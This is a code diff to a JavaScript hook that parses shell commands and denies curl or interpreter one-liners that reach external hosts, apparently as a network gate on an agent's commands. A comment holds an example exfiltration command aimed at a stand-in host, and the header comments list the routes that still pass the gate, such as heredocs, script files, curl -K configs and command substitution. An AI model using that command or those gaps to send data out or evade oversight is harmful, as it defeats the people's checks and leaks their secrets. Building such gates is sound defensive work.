@@ -6,7 +6,8 @@
 // negation, so it cannot say "any http EXCEPT localhost". Its own comment names what passes:
 // plain-http external fetches, interpreter one-liners (python3 -c, node -e), and a URL hidden in a
 // shell variable. This hook closes exactly those three shapes by PARSING the command:
-//   1. curl to an EXTERNAL http(s)/ftp URL (http:// included, which the deny list cannot cover);
+//   1. curl to an EXTERNAL destination: a scheme-bearing URL (http:// included, which the deny list
+//      cannot cover), and any positional / --url / proxy argument even WITHOUT a scheme;
 //   2. an interpreter one-liner (python/node/perl/ruby/php/deno/bun with -c/-e/-r/--eval) whose code
 //      carries an EXTERNAL URL;
 //   3. either of the above when the URL sits in a variable ASSIGNED IN THE SAME COMMAND.
@@ -23,7 +24,8 @@
 // the name-and-shape list will never be complete. Still open after (a): network calls INSIDE a script
 // file (`bash x.sh`, `python3 x.py` -- the hook sees only the outer command); heredoc-fed interpreters
 // (`python3 - <<'PY'`, `bash <<EOF`); a URL whose host is not literally in the command (read from a
-// file, the environment or a previous command); every other network-capable binary (git, pip, npm, ssh, scp, rsync, dig ...).
+// file, the environment, a previous command, a curl -K config, or computed by a substitution such as
+// `curl $(echo https://x)`); every other network-capable binary (git, pip, npm, ssh, scp, rsync, dig ...).
 // Closing those is direction (b): an allowlist / network-level gate, not this hook.
 //
 // Fail-open on unparseable input or an internal error (logged): a crashed gate must not silence the
@@ -185,6 +187,96 @@ export function liftSubstitutions(text) {
   }
   return { stripped: out, inners }
 }
+// curl's DESTINATION is not only a scheme-bearing URL. A positional argument is always a URL to
+// curl, and with no scheme curl guesses http:// -- so `curl evil.example.com/x?d=secret` reaches
+// the host while URL_RE (which needs a scheme) and the name list (`curl *https://*`) both miss it.
+// So for curl the argv is read: every positional argument, the --url value, and the proxy / DoH /
+// connect-to / resolve values are destinations, and a non-loopback host in any of them denies.
+// Flags that take a value are skipped with their value, so `-H "Host: x.y"` or `-o out.html` is
+// never read as a destination. An unknown long option is assumed to take no value: if that is
+// wrong, its value is read as a destination, which errs toward a deny, never toward a pass.
+const CURL_SHORT_WITH_VALUE = new Set('AbcCdDeEFHKmoPQrtTuUwxXyYz'.split(''))
+const CURL_LONG_WITH_VALUE = new Set([
+  'data', 'data-ascii', 'data-binary', 'data-raw', 'data-urlencode', 'json', 'form', 'form-string',
+  'header', 'proxy-header', 'output', 'output-dir', 'request', 'config', 'user', 'proxy-user',
+  'user-agent', 'referer', 'cookie', 'cookie-jar', 'dump-header', 'write-out', 'max-time',
+  'connect-timeout', 'retry', 'retry-delay', 'retry-max-time', 'range', 'continue-at', 'cert',
+  'cert-type', 'key', 'key-type', 'pass', 'cacert', 'capath', 'ciphers', 'interface', 'local-port',
+  'limit-rate', 'max-filesize', 'max-redirs', 'noproxy', 'upload-file', 'time-cond', 'trace',
+  'trace-ascii', 'stderr', 'unix-socket', 'abstract-unix-socket', 'oauth2-bearer', 'aws-sigv4',
+  'expect100-timeout', 'keepalive-time', 'happy-eyeballs-timeout-ms', 'variable', 'url-query',
+  'mail-from', 'mail-rcpt', 'mail-auth', 'hostpubmd5', 'hostpubsha256', 'pubkey', 'krb',
+  'delegation', 'dns-servers', 'dns-interface', 'dns-ipv4-addr', 'dns-ipv6-addr', 'speed-limit',
+  'speed-time', 'tls-max', 'proto', 'proto-redir', 'proto-default', 'etag-save', 'etag-compare',
+  'parallel-max', 'create-file-mode', 'ftp-port', 'quote', 'service-name', 'sasl-authzid',
+  'login-options', 'netrc-file', 'crlfile', 'engine', 'random-file', 'egd-file', 'socks5-gssapi-service',
+  // destination-bearing: read below, still consumed as values
+  'url', 'proxy', 'preproxy', 'socks4', 'socks4a', 'socks5', 'socks5-hostname', 'proxy1.0',
+  'doh-url', 'connect-to', 'resolve',
+])
+const CURL_DEST_URL = new Set(['url', 'proxy', 'preproxy', 'socks4', 'socks4a', 'socks5', 'socks5-hostname', 'proxy1.0', 'doh-url', 'x'])
+const CURL_DEST_PARTS = new Set(['connect-to', 'resolve']) // host:port:host:port / host:port:addr
+const HOSTNAME = /^(?:localhost|\d{1,3}(?:\.\d{1,3}){3}|\[[0-9a-f:.]+\]|(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,})$/i
+
+// Split a shell text into words, honouring quotes and backslashes (substitutions are already lifted).
+export function shellWords(text) {
+  const out = []; let cur = null; let i = 0
+  const push = () => { if (cur !== null) out.push(cur); cur = null }
+  while (i < text.length) {
+    const c = text[i]
+    if (/\s/.test(c)) { push(); i++; continue }
+    cur ??= ''
+    if (c === "'") { const e = text.indexOf("'", i + 1); const end = e === -1 ? text.length : e; cur += text.slice(i + 1, end); i = end + 1; continue }
+    if (c === '"') {
+      let j = i + 1
+      while (j < text.length && text[j] !== '"') { if (text[j] === '\\' && j + 1 < text.length) { cur += text[j + 1]; j += 2; continue } cur += text[j]; j++ }
+      i = j + 1; continue
+    }
+    if (c === '\\' && i + 1 < text.length) { cur += text[i + 1]; i += 2; continue }
+    cur += c; i++
+  }
+  push()
+  return out
+}
+// The host of a curl destination, scheme optional; null when it is not a literal hostname
+// (an unexpanded $VAR, a glob, a relative path).
+export function destHost(value) {
+  if (!value || value.includes('$')) return null
+  const noScheme = value.replace(/^[a-z][a-z0-9+.-]*:\/\//i, '')
+  const m = /^(?:[^@/?#]*@)?(\[[^\]]*\]|[^/:?#]*)/.exec(noScheme)
+  const h = m ? m[1].toLowerCase() : ''
+  return HOSTNAME.test(h) ? h : null
+}
+// Every external destination host in a curl argv (the words AFTER `curl`).
+export function curlDestinations(args) {
+  const dests = []
+  const addUrl = (v) => { const h = destHost(v); if (h) dests.push(h) }
+  const addParts = (v) => { for (const p of String(v).split(':')) if (HOSTNAME.test(p)) dests.push(p.toLowerCase()) }
+  for (let k = 0; k < args.length; k++) {
+    const w = args[k]
+    if (/^\d*[<>]/.test(w) || w === '&') { if (/^\d*(?:>>?|<)&?$/.test(w)) k++; continue } // redirection
+    if (w === '--' ) continue
+    if (w.startsWith('--')) {
+      const [name, inline] = w.slice(2).split(/=(.*)/s)
+      if (!CURL_LONG_WITH_VALUE.has(name)) continue
+      const v = inline !== undefined ? inline : args[++k]
+      if (CURL_DEST_URL.has(name)) addUrl(v)
+      else if (CURL_DEST_PARTS.has(name)) addParts(v)
+      continue
+    }
+    if (w.startsWith('-') && w.length > 1) {
+      for (let q = 1; q < w.length; q++) {
+        if (!CURL_SHORT_WITH_VALUE.has(w[q])) continue
+        const v = q + 1 < w.length ? w.slice(q + 1) : args[++k]
+        if (CURL_DEST_URL.has(w[q])) addUrl(v)
+        break
+      }
+      continue
+    }
+    addUrl(w) // positional: always a URL to curl
+  }
+  return dests.filter((h) => !LOCAL_HOSTS.has(h))
+}
 export function classify(command, depth = 0) {
   const norm = String(command ?? '').replace(/\\\r?\n/g, ' ')
   const { stripped: orig, inners } = liftSubstitutions(norm)
@@ -205,7 +297,13 @@ export function classify(command, depth = 0) {
     if (cmd === 'curl') target = 'curl'
     else if (INTERPRETER.test(cmd) && mw.slice(i + 1).some((w) => CODE_FLAG.has(w)) && NET_PRIMITIVE.test(text)) target = 'one-liner'
     if (!target) continue
-    const hosts = [...new Set([...text.matchAll(URL_RE)].map((m) => m[0]).filter(isExternal).map(hostOf))]
+    const found = [...text.matchAll(URL_RE)].map((m) => m[0]).filter(isExternal).map(hostOf)
+    if (target === 'curl') {
+      const argv = shellWords(text)
+      const at = argv.findIndex((w) => w.split('/').pop() === 'curl')
+      if (at !== -1) found.push(...curlDestinations(argv.slice(at + 1)))
+    }
+    const hosts = [...new Set(found)]
     if (hosts.length) return { deny: true, reason: `${target}-external`, hosts }
   }
   return { deny: false, reason: null, hosts: [] }
